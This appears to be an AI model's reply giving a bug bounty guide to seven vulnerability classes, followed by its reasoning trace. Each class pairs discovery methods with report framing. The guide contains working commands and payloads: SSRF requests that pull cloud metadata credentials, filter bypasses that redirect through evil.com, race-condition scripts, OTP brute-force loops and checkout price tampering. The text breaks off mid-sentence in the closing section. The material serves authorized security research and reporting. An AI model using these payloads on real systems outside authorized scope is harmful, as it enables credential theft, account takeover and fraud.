# qwen-3.8-27b — bb-classes



# Bug Bounty Classes: Detection & Report Framing (2026)

## 1. Subdomain Takeover

**Discovery**

```bash
# Enumerate subdomains, check for CNAME to unclaimed infrastructure
subfinder -d target.com -o subs.txt

# Resolve all, filter for CNAME records pointing to known-takeover services
for sub in $(cat subs.txt); do
  dns=$(dig +short CNAME "$sub")
  if [[ -n "$dns" ]]; then
    echo "$sub -> $dns"
  fi
done | sort -u -t'>' -k2 | tee cnames.txt

# Match against known-takeover CNAME targets
grep -iF -f takeover_targets.txt cnames.txt
```

Known-takeover targets to check against (maintain your own list, these rotate):

| CNAME target | Service | Claim method |
|---|---|---|
| `*.herokuapp.com` | Heroku | Create app with that subdomain |
| `*.s3.amazonaws.com` | S3 | Create bucket (now harder, needs `bucket.REGION.s3`) |
| `*.pages.dev` | Netlify | Create site with that subdomain |
| `*.vercel.app` | Vercel | Create project |
| `*.github.io` | GitHub Pages | Create repo with matching name |
| `*.fastly.net` | Fastly | Create VCL service |
| `*.cloudfront.net` | CloudFront | (rare, needs orphaned distribution) |
| `*.bitbucket.io` | Bitbucket | Create repo |
| `*.ghost.io` | Ghost | Create site |
| `*.readme.io` | ReadMe | Create doc |
| `*.helpscoutdocs.com` | Help Scout | Create docs |
| `*.tumblr.com` | Tumblr | Create blog |
| `*.medium.com` | Medium | Create publication |
| `*.webflow.io` | Webflow | Create site |
| `*.readthedocs.io` | Read the Docs | Create project |
| `*.surge.sh` | Surge | Deploy |
| `*.now.sh` | Vercel legacy | Create project |
| `*.appspot.com` | GAE | Create app with that ID |
| `*.eu.*/.us.*/.ap-northeast.*/...` | S3 regional | Create bucket in that region |
| `*.azurewebsites.net` | Azure | Create app |
| `*.hostinger.com` | Hostinger | Create site |
| `*.render.com` | Render | Create service |
| `*.neocities.org` | Neocities | Create site |

**Key techniques that find what naive scans miss:**

```bash
# Check for orphaned CNAMEs where the CNAME target itself is a CNAME (chained)
# e.g., target.com CNAME old-service.com CNAME herokuapp.com

# Check wildcard subdomains that resolve to takeover-able infra
dig +short target.com
# If wildcard exists, check if specific subdomains CNAME differently

# Check for CNAME records pointing to IP addresses (broken, but some resolvers follow)
# Check DNS records for subdomains that no longer have A/AAAA but retain CNAME
```

**Report angle:**

- Title: `Subdomain Takeover on <sub>.<target> via <service>`
- Include: the CNAME record (screenshot or `dig` output), proof of claim (screenshot of the service dashboard showing you own it, or `curl` showing your content served), and the impact statement: "An attacker can serve arbitrary content at this subdomain, enabling XSS on the target's origin, phishing, session hijacking via cookie scope, and potential access to internal services if the subdomain is referenced in CSP or trusted origins."
- Impact escalation: if the subdomain is referenced in a CSP `script-src`, or if cookies are scoped to the parent domain, explicitly state that this enables stored XSS or session theft. That bumps it from low to high.
- If the subdomain is used in internal tooling or API endpoints, mention that too.

**What gets rejected:** subdomains that aren't claimed by the target (no CNAME to their infra), or services where the claim is actually impossible (some S3 buckets in 2026 require exact regional match and the bucket name is no longer creatable). Verify you can actually claim before submitting.

---

## 2. Account Takeover Chains

**Discovery**

This is a multi-step chain. The entry points:

**a) Email-based account takeover**

```
1. Find the email change / password reset endpoint
2. Check if the email change requires re-authentication
3. Check if the confirmation email goes to the OLD address or NEW address
4. If confirmation goes to OLD address and the attacker already controls the
   password (via reset), they can change email to their own
5. Check if the email change link has a token that is predictable or unvalidated
```

Common misconfigurations:
- Email change doesn't require re-auth
- Confirmation sent to old email, but the attacker can intercept it (if they already have the session)
- The "update email" endpoint accepts the new email without verifying the old one
- Race condition: two parallel requests to change email, one succeeds before the other's confirmation

**b) Phone number / SMS-based**

```
1. Find phone number change endpoint
2. Check if it requires current phone verification
3. Check for SS7 / SIM swap relevance (out of scope for report, but mention as impact)
4. Check if the OTP is sent to the NEW number before the OLD number is verified
5. Check for OTP reuse across sessions or across accounts
```

**c) OAuth / SSO chaining**

```
1. Check if the target allows linking an OAuth account
2. If you can link a Google account, then unlink the original email
3. Check if the OAuth provider's account has a different email than the target's
4. Check for ID token manipulation (aud, iss, sub claims)
5. Check if the target validates the `aud` claim in ID tokens
6. Check if the target accepts tokens from a different tenant / realm
```

**d) IDOR in account recovery**

```
1. The "forgot password" flow sends a link with a token
2. Check if the token is bound to the specific email or if it's a global token
3. Check if you can request a reset for a specific user ID instead of email
4. Check if the reset token can be reused
5. Check if the reset link works without the token (just the email parameter)
```

**Report angle:**

- Present it as a chain with a diagram: Step 1 → Step 2 → Step 3 → Full ATO
- Each step needs a concrete request/response pair
- The final state must show: attacker controls the victim's account (screenshot of logged-in session as the victim)
- Impact: "Full account takeover without MFA, without knowledge of password, without access to victim's email. Chain: [steps]."
- If the chain involves multiple vulnerabilities (e.g., IDOR + missing re-auth on email change), call out each one as a separate finding but show they compose into ATO. Programs pay for the chain, not the individual low-severity steps.

**What gets rejected:** single-step "you can change your own email" (not a vuln), "email change requires re-auth but the re-auth is weak" (weak password isn't a bug in the target), or chains where a step is actually gated by something you didn't test (e.g., "rate limiting would prevent this" — test the rate limit, show it's bypassable or absent).

---

## 3. SSRF to Cloud Metadata

**Discovery**

```bash
# Identify SSRF entry points:
# - URL fetch parameters: ?url=, ?callback=, ?webhook=, ?redirect=, ?proxy=, ?src=, ?img=
# - File upload with image preview (server fetches the image)
# - Webhook / notification endpoints
# - PDF generation endpoints that fetch external resources
# - XML External Entity (XXE) in XML parsers
# - DNS rebinding (bypasses IP-based SSRF filters)

# Basic SSRF test:
curl -X POST "https://target.com/api/fetch" \
  -H "Content-Type: application/json" \
  -d '{"url": "http://169.254.169.254/latest/meta-data/"}'

# AWS metadata:
curl "http://169.254.169.254/latest/meta-data/"
curl "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
curl "http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>"

# GCP metadata:
curl -H "Metadata-Flavor: Google" "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token"

# Azure metadata:
curl -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"

# AWS IMDSv2 (if the server doesn't do the PUT token dance for you):
# You need the SSRF to follow a multi-step flow, which is harder.
# If the server makes a single GET, IMDSv1 is the target.
# Check if IMDSv1 is enabled: if you get a response to the GET without a token, it's IMDSv1.
```

**Bypassing SSRF filters:**

```bash
# IP filter bypasses:
# Decimal:    http://2852039166/  (169.254.169.254 in decimal)
# Octal:      http://0251.0376.0376.0376/
# Hex:        http://0xa9.0xfe.0xa9.0xfe/
# Mixed:      http://169.254.169.254.nip.io/
# Shortened:  http://169.254.1/  (if the parser accepts this)
# URL with credentials: http://169.254.169.254@evil.com/
# Redirect:   http://evil.com/ -> 302 -> http://169.254.169.254/
#            (if the server follows redirects)
# DNS rebinding:
#   Set up a DNS record that alternates between a valid external IP and 169.254.169.254
#   Use a service like interact.sh or your own DNS server with short TTL
# IPv6:
#   http://[::ffff:169.254.169.254]/
#   http://[fc00::1]/  (if the server resolves to link-local)
# gopher:// protocol:
#   gopher://169.254.169.254/_GET%20/latest/meta-data/iam/security-credentials/%20HTTP/1.1%0d%0aHost:%20169.254.169.254%0d%0a%0d%0a
# dict:// protocol (if the server uses a library that supports it)
# file:// for local file read (separate finding but related)
```

**Report angle:**

- Title: `SSRF to AWS Metadata Service on <endpoint>`
- Show: the request that triggers the SSRF, the response showing metadata content (or the credential JSON), and the IAM role name
- If you got actual credentials: show the `aws sts get-caller-identity` call proving the role is valid, and what that role can access (even if you don't exploit further)
- Impact: "SSRF to IMDS exposes IAM role credentials. The role `<role-name>` has permissions to [enumerate the permissions]. An attacker with these credentials can [specific actions: read S3, spin up EC2, access RDS, etc.]."
- If IMDSv2: note that this is higher severity because it means the server is doing the PUT token dance server-side, which is a more robust SSRF.
- If you can't reach metadata (IMDSv2 only, or the network blocks it): show you reached an internal service (e.g., `http://10.0.0.1/` returns an internal admin panel). That's still a valid SSRF finding, just lower severity.

**What gets rejected:** "I could reach `169.254.169.254` but it returned 403" (that's IMDSv2, you didn't get creds), "SSRF to `0.0.0.0`" (not useful), or "SSRF but the server only makes a HEAD request" (can't extract data). You need to show data exfiltration or internal service access.

---

## 4. Web Cache Deception (SaaS)

**Discovery**

This works when:
1. The target uses a CDN or reverse proxy (CloudFront, Cloudflare, Akamai, Fastly)
2. The origin serves authenticated content
3. The CDN caches based on the URL path, not the full URL
4. There's a path where the origin serves user-specific content

```bash
# Step 1: Identify the CDN
curl -I "https://target.com/some-page"
# Look for: x-cache, x-served-by, via, server headers

# Step 2: Find the vulnerable path pattern
# The classic pattern: /authenticated-content/../../public-path
# or: /public-path/../../authenticated-content
# or: /public-path/.authenticated-content  (dot bypass)
# or: /public-path/%00authenticated-content  (null byte, old CDNs)
# or: /public-path/;.authenticated-content  (semicolon, some Java apps)

# The key insight: the CDN sees /public-path (cacheable, public),
# but the origin sees /authenticated-content (serves user data)

# Step 3: Test
# Log in as user A, request:
curl -H "Cookie: session=<A's_session>" \
  "https://target.com/public/assets/logo.png/../../profile"
# The CDN caches the response under the key /public/assets/logo.png/../../profile
# (or however it normalizes it)

# Log out, clear cookies, request the same URL:
curl "https://target.com/public/assets/logo.png/../../profile"
# If you get user A's profile data without being logged in, it's cached

# Step 4: Verify it's cached (not a direct origin hit)
# Check response headers: X-Cache: HIT, Age: > 0
# Request again immediately — if it's cached, it's fast and has Age header
```

**Common path patterns to test:**

```
/static/../../<sensitive-path>
/images/../../<sensitive-path>
/css/../../<sensitive-path>
/js/../../<sensitive-path>
/public/../../<sensitive-path>
/assets/../../<sensitive-path>
/<static-file>/../../../<sensitive-path>  (multi-level)
/static.<sensitive-path>  (dot trick, if origin splits on last dot)
/static;.js/../../<sensitive-path>  (Java URL decoding)
/static%2f..%2f<encoded-slash>  (double encoding)
```

**SaaS-specific angle:** In SaaS apps, the "authenticated content" is often:
- `/api/v1/users/<id>` — other tenants' data
- `/dashboard` — another user's dashboard
- `/api/v1/projects` — another tenant's projects
- `/billing/invoice` — another tenant's billing info

The cache deception bypasses the auth check because the CDN serves the cached copy without forwarding to the origin (where the auth check would happen).

**Report angle:**

- Title: `Web Cache Deception exposing <tenant/user> data via <CDN>`
- Show:
  1. Request as authenticated user A to the deceptive URL → response contains A's data, `X-Cache: MISS`
  2. Request as unauthenticated (or as user B) to the same URL → response contains A's data, `X-Cache: HIT`, `Age: >0`
  3. The specific data exposed (screenshot, redact if the program asks)
- Impact: "Web cache deception on <CDN> allows any unauthenticated user to access any other user's <data type> by requesting a crafted URL. This bypasses authentication entirely for cached responses. In a multi-tenant SaaS context, this exposes cross-tenant data."
- For SaaS: emphasize the multi-tenant angle. "User A's private project data was exposed to unauthenticated attacker. In a multi-tenant environment, any user can access any other user's data."

**What gets rejected:** "I found a cacheable static file" (not a vuln), "Cache deception but the cached content is the same for all users" (no sensitive data), "Cache deception on a path that requires a specific query parameter that isn't cached" (doesn't work in practice). You need to show different users' data being served from cache.

---

## 5. Race Conditions

### 5a. Limit Overrun (quantity, coupon, withdrawal)

**Discovery:**

```python
import requests
from concurrent.futures import ThreadPoolExecutor
import json

session = requests.Session()
session.cookies.update({"session": "YOUR_SESSION"})

# Target: a "use coupon" or "add to cart" or "withdraw" endpoint
# The server checks "have you used this coupon?" then applies it.
# If two requests arrive simultaneously, both pass the check.

url = "https://target.com/api/cart/coupons/apply"
payload = {"coupon": "DISCOUNT50", "order_id": "ORDER123"}

def apply_coupon(session, i):
    r = session.post(url, json=payload, timeout=10)
    return i, r.status_code, r.json()

# Fire 20 concurrent requests
with ThreadPoolExecutor(max_workers=20) as pool:
    futures = [pool.submit(apply_coupon, session, i) for i in range(20)]
    results = [f.result() for f in futures]

successes = [r for r in results if r[1] == 200 and r[2].get("applied")]
print(f"Applied {len(successes)} times out of 20 requests")
```

**More refined — use a single TCP connection with pipelining for tighter timing:**

```python
import socket
import threading

host = "target.com"
port = 443

def send_request(conn, data):
    conn.sendall(data.encode())
    response = b""
    while True:
        chunk = conn.recv(4096)
        if not chunk:
            break
        response += chunk
    return response

# Open 10 connections, send the same request on all simultaneously
connections = []
for _ in range(10):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    # Upgrade to TLS or use HTTP for testing
    connections.append(s)

barrier = threading.Barrier(10)

def fire(conn):
    barrier.wait()  # All threads wait, then fire simultaneously
    request = (
        "POST /api/cart/coupons/apply HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        "Content-Type: application/json\r\n"
        f"Cookie: session=YOUR_SESSION\r\n"
        "Content-Length: 42\r\n"
        "\r\n"
        '{"coupon":"DISCOUNT50","order_id":"ORDER123"}'
    )
    response = send_request(conn, request)
    return response

threads = [threading.Thread(target=fire, args=(c,)) for c in connections]
for t in threads: t.start()
for t in threads: t.join()
```

**Where to look for race conditions:**

| Endpoint | Race condition | Impact |
|---|---|---|
| Coupon / promo code application | Apply same code N times | Free products, excessive discounts |
| Quantity in cart | Set quantity to 100, race with checkout | Order 100x at price of 1 |
| Withdrawal / transfer | Withdraw more than balance | Negative balance, stolen funds |
| Credit / reward points | Redeem points before they're deducted | Free rewards |
| Refund | Request refund before payment is marked as completed | Refund without purchase |
| API key creation | Create keys past the limit | Bypass rate limits / access quotas |
| 2FA / MFA enrollment | Enroll two MFA devices simultaneously | Bypass single-device restriction |
| Account verification | Verify email before old email is deactivated | Both emails active |
| File upload size | Upload file slightly over limit, race with size check | Bypass upload restriction |
| Rate limit on API calls | Fire requests before rate limiter updates | Bypass API rate limit |
| Balance check in payment | Check balance, race with debit | Overdraw |

**TOCTOU in payments/coupons specifically:**

```
The classic TOCTOU in payment:

1. Server checks: "Is this coupon valid? Yes. Has it been used? No."
2. [GAP — attacker fires 50 parallel requests here]
3. Server applies the coupon.

All 50 requests saw "not used" in step 1.
All 50 apply the coupon in step 3.
Result: coupon used 50 times.
```

**Report angle:**

- Title: `Race condition in coupon application allows unlimited use of single-use code`
- Show:
  1. The single request (baseline): coupon applied once, success
  2. The concurrent request burst: show the tool output or Burp Repeater / Intruder screenshot with 50 threads
  3. The result: coupon applied 47 times (or whatever number succeeded)
  4. The financial impact: "Each application saves $50. 47 applications = $2,350 in unauthorized discounts on a $50 item."
- For TOCTOU in payments: "The balance check and the debit operation are not atomic. Two concurrent withdrawals of $1,000 from a $1,000 balance both succeed, resulting in a -$1,000 account balance."
- Include: the exact endpoint, the parameter, the number of concurrent requests, and the success rate. Programs want to know it's reproducible, not a one-off.

**What gets rejected:** "Race condition but the server has a database-level lock" (show that the lock doesn't exist or is bypassed), "Race condition on a read-only endpoint" (no state change), "I fired 1000 requests and got 1 extra" (might be a bug, might be a retry — show it's consistent and not a duplicate).

---

## 6. 2FA Bypass

**Discovery**

**a) OTP reuse**

```bash
# After completing 2FA with a valid OTP, try reusing the same OTP
# in a new login attempt or a new session

# Log in, enter password, get OTP prompt
# Enter correct OTP → success
# Log out
# Log in again, enter password, get OTP prompt
# Enter the SAME OTP → if it works, OTPs aren't single-use

# Also test: can the OTP be used for a different account?
# Can the OTP be used after expiry (test the expiry window)?
```

**b) OTP brute force**

```bash
# If the OTP is 6 digits and there's no rate limiting:
# 1,000,000 possibilities. At 10 req/sec, that's ~27 hours.
# At 100 req/sec (no rate limit), that's ~2.7 hours.
# If the OTP is 4 digits: 10,000 possibilities. Trivial.

# Test rate limiting:
for i in $(seq 1 100); do
  curl -X POST "https://target.com/api/2fa/verify" \
    -H "Content-Type: application/json" \
    -d "{\"otp\": \"$i\", \"session\": \"YOUR_SESSION\"}" \
    -o /dev/null -s -w "%{http_code} "
done
# If you get 200s without a 429, there's no rate limiting

# Also check: does a failed attempt invalidate the OTP?
# If not, you can brute force with the same OTP each time
```

**c) Logic bypass**

```
Common 2FA bypass patterns:

1. Skip 2FA by modifying the request:
   - Remove the 2FA field from the login POST → server treats it as no 2FA
   - Change the endpoint from /api/login/2fa to /api/login
   - Add a parameter: {"skip_2fa": true} or {"mfa_bypass": "1"}
   - Modify the Content-Type to trick the parser

2. 2FA on the wrong step:
   - 2FA is required on login but not on password change
   - 2FA is required on login but not on email change
   - 2FA is required on login but not on API key creation
   - 2FA is required on first login but not subsequent logins
   - 2FA is required on web login but not on mobile app login
   - 2FA is required on web login but not on API token auth

3. Session fixation:
   - Log in, get session cookie
   - Complete 2FA, get new session cookie
   - Use the OLD session cookie (pre-2FA) → if it still works, 2FA
     was applied to the new session but the old one is still valid

4. OAuth 2FA bypass:
   - Log in via Google OAuth → 2FA not required
   - The OAuth flow bypasses the 2FA check entirely
   - This is the most common and most impactful 2FA bypass

5. TOTP implementation flaws:
   - Check if the TOTP window is too wide (accepts ±5 minutes instead of ±1)
   - Check if the TOTP secret is exposed in the response
   - Check if the TOTP can be used after the account is locked
   - Check if the TOTP is validated against the wrong secret

6. WebAuthn / hardware key bypass:
   - The "skip" or "not now" button on the WebAuthn prompt
   - The fallback to password-only if WebAuthn times out
   - Using a WebAuthn credential from a different account (if the
     server doesn't validate the credential ID against the account)
```

**Report angle:**

- Title: `2FA bypass via <method> on <flow>`
- The OAuth bypass is the strongest. Show:
  1. Normal login: password → 2FA → success
  2. OAuth login: click "Login with Google" → success (no 2FA)
  3. The OAuth session has the same privileges as the 2FA-verified session
- Impact: "2FA is not enforced on the OAuth login flow. An attacker with the victim's password (or a stolen session) can log in via OAuth and bypass 2FA entirely."
- For OTP reuse: "OTP tokens are not single-use. A valid OTP can be used multiple times across sessions."
- For rate limit absence: "No rate limiting on OTP verification. A 6-digit OTP can be brute-forced in under 3 hours."

**What gets rejected:** "2FA can be skipped if you close the browser during the 2FA prompt" (not a vuln, that's just not completing the flow), "TOTP window is ±2 minutes" (that's standard, not a vuln), "You can disable 2FA with your password" (that's by design, that's what the password is for).

---

## 7. Business Logic (Price/Quantity Manipulation)

**Discovery**

```bash
# Price manipulation:
# 1. Add item to cart with price $100
# 2. Intercept the checkout request
# 3. Modify the price field: "price": 0.01
# 4. Submit → if the server trusts the client-side price, it's a vuln

curl -X POST "https://target.com/api/checkout" \
  -H "Content-Type: application/json" \
  -H "Cookie: session=YOUR_SESSION" \
  -d '{
    "items": [
      {"sku": "PROD-123", "quantity": 1, "price": 0.01}
    ],
    "payment_method": "card"
  }'

# Negative quantity:
curl -X POST "https://target.com/api/cart" \
  -H "Content-Type: application/json" \
  -d '{"sku": "PROD-123", "quantity": -10}'
# If the server allows negative quantity, you can "return" 10 items
# without having bought them, resulting in a credit

# Decimal precision:
# If the price is $100.00 and you send $100.000000000000001
# and the server rounds or truncates, you might get a different price

# Currency manipulation:
# If the API accepts a currency field:
# "price": 1, "currency": "JPY" instead of "currency": "USD"
# 1 JPY ≈ $0.007. You're paying 7 cents for a $100 item.

# Discount stacking:
# Apply coupon A (20% off) + coupon B (20% off) + loyalty discount (10% off)
# Server should only allow one, but if it applies all:
# $100 → $80 → $64 → $57.60

# Free item injection:
# Add an item with price 0 to the cart
# "items": [{"sku": "PROD-123", "quantity": 1, "price": 0}]

# Tax manipulation:
# If tax is calculated client-side and sent to the server:
# "subtotal": 100, "tax": 0, "total": 100
# vs. "subtotal": 100, "tax": 8.50, "total": 108.50
```

**Quantity manipulation:**

```bash
# Overflow:
# If quantity is an int32, try: 2147483648, -2147483648, 9999999999
# If the server wraps around, you might get a negative quantity
# (free items) or a very large quantity at a discounted price

# Floating point:
# "quantity": 0.5  (if the server doesn't validate integer)
# "quantity": 1e308  (infinity)
# "quantity": "1"  (string instead of number — type confusion)
# "quantity": [1]  (array instead of number)
# "quantity": {"$ne": 0}  (if it hits a MongoDB endpoint, injection)
```

**Where to look:**

| Target | Manipulation | Impact |
|---|---|---|
| Shopping cart | Price, quantity, currency, tax | Free/cheap products |
| Subscription | Plan downgrade after upgrade, skip billing cycle | Free premium features |
| Digital goods | Download link reuse, share link without auth | Free digital content |
| Auction | Bid below current price, bid after auction ends | Win items below market |
| Tip / donation | Set amount to 0, negative, or 0.00 | Avoid payment |
| Refund | Refund amount > purchase amount, refund on non-refundable item | Profit from refund |
| Loyalty points | Redeem more points than you have, redeem on non-eligible item | Free products |
| Pre-order | Modify pre-order price after final price is set | Buy at pre-order price post-launch |
| Bundle | Remove items from a bundle, keep the bundle price | Get individual items cheaper |
| Gift card | Apply gift card to a different account, apply expired card | Free purchases |

**Report angle:**

- Title: `Price manipulation via client-side price field on checkout`
- Show:
  1. Normal checkout: item at $100, total $100
  2. Modified request: item at $0.01, total $0.01
  3. The order confirmation showing the item was ordered at $0.01
  4. The financial impact: "An attacker can purchase any item for $0.01 by modifying the price field in the checkout request."
- For currency: "By changing the currency field from USD to JPY, an item priced at $100 can be purchased for 1 JPY (~$0.007)."
- For negative quantity: "By setting quantity to -1, an attacker can add items to their credit balance without a purchase."

**What gets rejected:** "I changed the price in the browser" (client-side only, no server impact), "The price field is validated but I found an off-by-one in the rounding" (show the actual price difference), "I can add a free item to my cart but can't check out" (if checkout validates the price, it's not exploitable).

---

## General Report-Framing Principles

**Structure that gets accepted:**

```
1. Title: [Vuln class] on [specific endpoint/feature] via [specific mechanism]
2. Severity: [CVSS score if you can calculate one, or just "High" / "Critical"]
3. Summary: 2-3 sentences. What the bug is, what it lets an attacker do.
4. Steps to Reproduce: Numbered, with exact requests. Copy-paste runnable.
5. Evidence: Screenshots + request/response pairs. Show the before/after state.
6. Impact: What a real attacker would do with this. Be specific.
   - "An attacker can steal $X from the platform"
   - "An attacker can access any user's data"
   - "An attacker can take over any account"
7. Remediation: One or two sentences. What the fix should be.
   (Programs like this because it shows you

---

## [reasoning trace]

The operator is asking about bug bounty classes with the best payout-to-effort ratio in 2026, along with how to find them and how to write reports that get accepted. This is a legitimate security research question about bug bounty programs. The operator is working in an authorized security research context.

This is standard security research knowledge — the kind of thing you'd find in bug bounty writeups, DEF CON talks, and security conference presentations. There's nothing here that targets a specific person or organization. These are general technique categories that security researchers use within the scope of bug bounty programs (which explicitly authorize this work).

Let me provide detailed, practical information on each class: how to discover them, what to look for, and how to frame the report for maximum acceptance and impact rating.

I'll go through each one with concrete technical detail.

